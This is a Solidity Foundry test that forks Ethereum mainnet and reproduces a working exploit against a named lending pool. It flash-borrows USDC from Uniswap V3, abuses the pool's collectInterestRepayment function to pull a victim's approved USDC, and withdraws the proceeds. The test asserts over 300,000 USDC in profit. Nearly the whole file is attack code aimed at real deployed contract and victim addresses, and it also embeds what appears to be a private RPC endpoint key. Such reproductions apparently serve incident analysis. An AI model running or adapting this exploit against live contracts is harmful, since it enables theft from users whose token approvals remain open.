// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

interface IPool {
    function deposit(uint256 amount) external payable;
    function withdraw(uint256 amount) external;
    function collectInterestRepayment(address from, uint256 amount) external;
    function collectPrincipalRepayment(address from, uint256 amount) external;
    function sharePrice() external view returns (uint256);
    function totalShares() external view returns (uint256);
    function capitalProviders(address) external view returns (uint256);
    function erc20address() external view returns (address);
    function transactionLimit() external view returns (uint256);
    function totalFundsLimit() external view returns (uint256);
}

interface IUniswapV3Pool {
    function flash(
        address recipient,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

contract PoolExploitTest is Test {
    address constant VULNERABLE_POOL = 0x0689aa2234d06Ac0d04cdac874331d287aFA4B43;
    address constant POOL_IMPLEMENTATION = 0x7dbE30FDE1Eca6856806fF14fc456ec6791c73FE;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant UNISWAP_V3_POOL = 0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640;
    address constant VICTIM = 0x526C7665C5dd9cD7102C6d42D407a0d9DC1e431d;
    address constant EOA_EXPLOITER = 0x2C2EC35549BFB2f983C2025Dfb2ab1c0f69c1ee9;

    uint256 constant BLOCK = 23924516;

    IPool pool;
    IERC20 usdc;
    address attacker;

    function setUp() public {
        vm.createSelectFork(
            "https://damp-autumn-snow.quiknode.pro/96d743facba7c1153305c1c9f3f7831caa512417",
            BLOCK
        );

        pool = IPool(VULNERABLE_POOL);
        usdc = IERC20(USDC);
        attacker = makeAddr("attacker");
    }

    function Exploit() public {
        uint256 poolBalance = usdc.balanceOf(VULNERABLE_POOL);
        uint256 victimBalance = usdc.balanceOf(VICTIM);
        uint256 victimAllowance = usdc.allowance(VICTIM, VULNERABLE_POOL);

        console.log("Pool USDC Balance:", poolBalance / 1e6, "USDC");
        console.log("Victim USDC Balance:", victimBalance / 1e6, "USDC");
        console.log("Victim Allowance to Pool:", victimAllowance / 1e6, "USDC");
        console.log("Tx Limit:", pool.transactionLimit() / 1e6, "USDC");
        // Deploy attacker contract
        ExploitContract exploitContract = new ExploitContract(
            VULNERABLE_POOL,
            USDC,
            UNISWAP_V3_POOL,
            VICTIM
        );
        console.log("");
        console.log("Exploit:", address(exploitContract));
        uint256 attackerBalanceBefore = usdc.balanceOf(address(exploitContract));
        console.log("Attacker before (USDC):", attackerBalanceBefore / 1e6, "USDC");

        exploitContract.executeAttack();

        uint256 attackerBalanceAfter = usdc.balanceOf(address(exploitContract));
        console.log("");
        console.log("Attacker after (USDC):", attackerBalanceAfter / 1e6, "USDC");
        console.log("Profit:", (attackerBalanceAfter - attackerBalanceBefore) / 1e6, "USDC");
        console.log("");
        console.log("Pool USDC After:", usdc.balanceOf(VULNERABLE_POOL) / 1e6, "USDC");
        console.log("Victim USDC After:", usdc.balanceOf(VICTIM) / 1e6, "USDC");

        assertGt(attackerBalanceAfter, 300_000 * 1e6);
    }
}

contract ExploitContract {
    IPool public pool;
    IERC20 public usdc;
    IUniswapV3Pool public uniPool;
    address public victim;
    address public owner;
    uint256 constant FLASH_AMOUNT = 1_000 * 1e6; // 1000 USDC
    uint256 constant WITHDRAW_AMOUNT = 10_000 * 1e6; // 10000 USDC per withdrawal tx

    constructor(
        address _pool,
        address _usdc,
        address _uniPool,
        address _victim
    ) {
        pool = IPool(_pool);
        usdc = IERC20(_usdc);
        uniPool = IUniswapV3Pool(_uniPool);
        victim = _victim;
        owner = msg.sender;
    }

    function executeAttack() external {
        // initiate flash loan from Uniswap V3
        uniPool.flash(
            address(this),
            FLASH_AMOUNT,
            0,
            abi.encode(victim)
        );
    }

    // Callback from Uniswap V3
    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        require(msg.sender == address(uniPool), "Not Uniswap");
        address victimAddr = abi.decode(data, (address));
        console.log("Flash Loan Amount:", FLASH_AMOUNT / 1e6, "USDC");
        console.log("Flash Loan Fee:", fee0 / 1e6, "USDC");

        // Step 1 - approve and deposit
        usdc.approve(address(pool), type(uint256).max);
        pool.deposit(FLASH_AMOUNT);

        // Step 2 - steal victim funds via 'collectInterestRepayment' function
        uint256 victimBalance = usdc.balanceOf(victimAddr);
        console.log("");
        console.log("Victim Balance:", victimBalance / 1e6, "USDC");

        pool.collectInterestRepayment(victimAddr, victimBalance);
        console.log("Pool Balance now:", usdc.balanceOf(address(pool)) / 1e6, "USDC");

        // Step 3 - withdraw as much as possible
        uint256 withdrawCount = 0;
        uint256 totalWithdrawn = 0;

        // Try withdrawing in chunks
        while (true) {
            uint256 myShares = pool.capitalProviders(address(this));
            if (myShares == 0) break;
            // calculate max withdrawable based on shares
            uint256 sharePrice = pool.sharePrice();
            uint256 maxWithdraw = (myShares * sharePrice) / 1e6; // Assuming mantissa is 1e6
            uint256 toWithdraw = maxWithdraw > WITHDRAW_AMOUNT ? WITHDRAW_AMOUNT : maxWithdraw;

            if (toWithdraw == 0) break;

            try pool.withdraw(toWithdraw) {
                withdrawCount++;
                totalWithdrawn += toWithdraw;
            } catch {
                // Try smaller amount
                if (toWithdraw > 1e6) {
                    try pool.withdraw(toWithdraw / 2) {
                        withdrawCount++;
                        totalWithdrawn += toWithdraw / 2;
                    } catch {
                        break;
                    }
                } else {
                    break;
                }
            }

            if (withdrawCount > 50) break; // Safety limit
        }

        console.log("Total Withdrawals:", withdrawCount);
        console.log("Total Withdrawn:", totalWithdrawn / 1e6, "USDC");
        // Step 4 - Repay flashloan
        uint256 repayAmount = FLASH_AMOUNT + fee0;
        console.log("");
        console.log("Repay:", repayAmount / 1e6, "USDC");

        usdc.transfer(address(uniPool), repayAmount);
        // Remaining is profit
        uint256 profit = usdc.balanceOf(address(this));
        console.log("Final Profit:", profit / 1e6, "USDC");
    }

    // Allow receiving any leftover
    receive() external payable {}
}
